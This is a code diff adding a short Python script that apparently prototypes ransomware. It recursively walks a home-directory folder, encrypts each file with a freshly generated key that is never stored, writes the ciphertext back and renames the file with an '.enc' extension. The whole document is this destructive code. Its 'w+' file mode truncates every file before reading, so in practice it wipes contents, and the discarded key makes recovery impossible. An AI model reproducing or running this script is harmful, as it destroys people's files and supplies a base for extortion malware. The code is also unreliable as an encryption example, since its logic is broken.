@@ -1,0 +1,47 @@
+import os
+import time
+from cryptography.fernet import Fernet
+
+g_key = 0
+g_newFile = 0
+key = Fernet.generate_key()
+
+def decryptFile(File, cipher):
+	print "Decrypting"
+	fo = open(File, "w+")
+	print "File to Decrypt", fo.name
+	ddata = fo.read();
+	print ddata
+	plain_suite = Fernet(key)
+	plain_text = plain_suite.decrypt(cipher)
+	print plain_text
+
+def encryptFile(File):
+#	if File == "encryptme":
+		print "Encrypting"
+		fo = open(File, "w+")
+		print "File Name >> ", fo.name
+		fdata = fo.read();
+		cipher_suite = Fernet(key)
+		cipher_text = cipher_suite.encrypt(fdata)
+		print cipher_text
+		#plain_text = cipher_suite.decrypt(cipher_text)
+		#print plain_text
+		print "Writing Cipher Text to File"
+		fo.write(cipher_text)
+		os.rename(File, File+".enc")
+		g_newFile = File+".enc"
+#		decryptFile(g_newFile, cipher_text)	
+		fo.close()
+
+def listFiles():
+	#files = os.listdir("./")
+	files = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser("~/vmware-tools-distrib")) for f in fn]
+	print files
+	for x in files:
+		#encryptFileWithGPG(x)	
+		encryptFile(x)
+		#time.sleep(2)
+		#decryptFile(g_newFile)	
+
+listFiles()
